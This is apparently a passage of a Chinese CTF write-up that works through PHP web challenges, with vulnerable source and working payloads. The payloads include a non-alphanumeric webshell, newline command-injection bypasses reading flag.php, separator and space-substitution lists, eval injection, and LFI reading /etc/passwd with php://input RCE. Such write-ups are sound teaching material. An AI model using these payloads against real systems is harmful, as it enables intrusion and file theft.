class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#变量c不能含有$black_list数组中的元素</span></span><br><span class="line"><span class="variable">$filename</span>=rand_string(<span class="number">0x20</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="variable">$folder</span>=<span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$full_filename</span> = <span class="variable">$folder</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="variable">$full_filename</span>, <span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span>.<span class="variable">$full_filename</span>.<span class="string">&quot;&#x27;&gt;WebShell&lt;/a&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Enjoy your webshell~&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Some thing wrong...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<blockquote>
+<p>这题考察的是构造无字母数字Webshell，有点晕，附文章先学习一波</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a></p>
+</blockquote>
+<blockquote>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code><br>system()—执行shell命令也就是向dos发送一条指令<br>cat命令可以用来查看文件内容<br><?php  $a=array(); echo $a;?> #Array<br><?php  $a=array(); $b=array(); echo $a.$b;?>  #ArrayArray<br><?php  $a=array(); $b="asd"; echo $a.$b;?>  #Arrayasd</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[];</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET</span></span><br><span class="line">var_dump($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[_]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[__])); <span class="comment">// $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span><span class="operator">=</span><span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%5</span>b<span class="variable">%5</span>d.<span class="variable">%5</span>b<span class="variable">%5</span>d<span class="variable">%3</span>b<span class="variable">%24</span>__<span class="variable">%3</span>d<span class="variable">%27</span><span class="variable">%27</span><span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%5</span>b<span class="variable">%27</span><span class="variable">%27</span><span class="variable">%5</span>d<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__.<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__<span class="variable">%3</span>d<span class="variable">%24</span>_.<span class="variable">%24</span>__<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>_<span class="variable">%3</span>d<span class="variable">%2</span>b<span class="variable">%2</span>b<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span>__.<span class="variable">%3</span>d<span class="variable">%24</span>_<span class="variable">%3</span>b<span class="variable">%24</span><span class="variable">%7</span>b<span class="variable">%27</span>_<span class="variable">%27</span>.<span class="variable">%24</span>__<span class="variable">%7</span>d<span class="variable">%5</span>b_<span class="variable">%5</span>d(<span class="variable">%24</span><span class="variable">%7</span>b<span class="variable">%27</span>_<span class="variable">%27</span>.<span class="variable">%24</span>__<span class="variable">%7</span>d<span class="variable">%5</span>b__<span class="variable">%5</span>d)<span class="variable">%3</span>b</span><br></pre></td></tr></table></figure>
+<p>写入full_filename，成功上传webshell，命令执行<code>?_=system&amp;__=cat%20../flag.php</code></p>
+<p>即<code>system(cat%20../flag.php)</code></p>
+<h1 id="challenge-9"><a href="#challenge-9" class="headerlink" title="challenge 9"></a>challenge 9</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ])) &#123;</span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;|&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$target</span>;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到基本上的命令分隔符都被过滤了，可以可以换行（%0a）绕过</p>
+<blockquote>
+<p>多条命令设置在同一个快捷键时，需要注意命令分隔符的使用</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">Payload: ?<span class="attribute">ip</span>=127.0.0.1%0als</span><br></pre></td></tr></table></figure>
+
+<p>cat命令可以用来查看文件内容<code>?ip=127.0.0.1%0acat flag.php</code></p>
+<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+</blockquote>
+<p>命令分隔符</p>
+<blockquote>
+<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
+</blockquote>
+<p>空格可以用以下字符串代替</p>
+<blockquote>
+<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
+</blockquote>
+<h1 id="challenge-10"><a href="#challenge-10" class="headerlink" title="challenge 10"></a>challenge 10</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;answer&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$number</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;answer&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (noother_says_correct(<span class="variable">$number</span>))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;  <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$one</span> = ord(<span class="string">&#x27;1&#x27;</span>);  <span class="comment">#ord() 函数:返回字符串的首个字符的 ASCII 值</span></span><br><span class="line">    <span class="variable">$nine</span> = ord(<span class="string">&#x27;9&#x27;</span>); </span><br><span class="line">    <span class="comment"># Check all the input characters! </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment"># Disallow all the digits! </span></span><br><span class="line">        <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;); </span><br><span class="line">        <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) ) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="comment"># Aha, digit not allowed! </span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">#要求传入的每一个值都不能大于等于1小于等于9</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment"># Allow the magic number ... </span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&quot;3735929054&quot;</span>; <span class="comment">#弱类型比较</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>需要POST一个不含1-9数字的，且与<code>3735929054</code>等值的字符串</p>
+<blockquote>
+<p>十六进制弱类型比较</p>
+<p>十六进制：(0x)deadc0de</p>
+<p>八进制：0+</p>
+</blockquote>
+<h1 id="challenge-11"><a href="#challenge-11" class="headerlink" title="challenge 11"></a>challenge 11</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;<span class="comment"># 输入的必须为数字或字母</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>var_dump($$a)中存在$$a，可以输出对应的变量值,即flag,但前提是需要知道flag的变量名，可利用$GLOBALS，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/12721175.html">https://www.cnblogs.com/NPFS/p/12721175.html</a></p>
+</blockquote>
+<h1 id="challenge-12"><a href="#challenge-12" class="headerlink" title="challenge 12"></a>challenge 12</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>做法类似challenge 4</p>
+<blockquote>
+<p>var_dump($a)可考虑命令执行，构造<code>?hello=);var_dump(file(&quot;flag.php&quot;));//</code><br>var_dump($a); —-&gt;<code> var_dump();var_dump(file(&quot;flag.php&quot;));//);</code></p>
+</blockquote>
+<h1 id="challenge-13"><a href="#challenge-13" class="headerlink" title="challenge 13"></a>challenge 13</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;  <span class="comment">//120秒之后销毁会话</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);  <span class="comment">//range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组</span></span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].<span class="variable">$str_rand</span>[mt_rand(<span class="number">0</span>,<span class="number">25</span>)]; <span class="comment">//生成两个随机字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>]==(<span class="variable">$value</span>[<span class="number">0</span>].<span class="variable">$value</span>[<span class="number">1</span>]) &amp;&amp; substr(md5(<span class="variable">$value</span>),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125; <span class="comment">//当whoami=value时，num+1，whoami=$str_rands；==弱类型比较</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;  <span class="comment">//循环10次输出flag</span></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>120秒直接手工传参，传十次就得到flag了</p>
+<p>也可以写个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://XXX&#x27;</span></span><br><span class="line">a=requests.Session()</span><br><span class="line">b=a.get(url+<span class="string">&#x27;?value[]=ea&#x27;</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    b=a.get(url+&#x27;?value[]=&#x27;+ b[0:2]).text  //这里的b[0:2]是获取读取的源代码的前两个字符,因为手工传一次`?value[]=ea`后可以发现，新的随机数在源码最前面  </span><br><span class="line">    print(b)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="challenge-14"><a href="#challenge-14" class="headerlink" title="challenge 14"></a>challenge 14</h1><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">PHP logo</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在linux文件/etc/passwd中包含用户名、用户[ID]、用户群组[ID]、用户描述信息、家目录以及登录shell<br>?path=../../../../etc/passwd<br>allow_url_include打开着,使用php://input协议，post传递参数<?php system("ls");?>，可以发现flag.php</p>
+<p>直接使用<code>php://filter/read=convert.base64-encode/resource=flag.php</code>读取文件内容<br>也可以继续使用php://input协议，post传递参数<?php system("cat flag.php");?></p>
+</blockquote>
+<h1 id="challenge-15"><a href="#challenge-15" class="headerlink" title="challenge 15"></a>challenge 15</h1><p><strong>源码</strong></p>
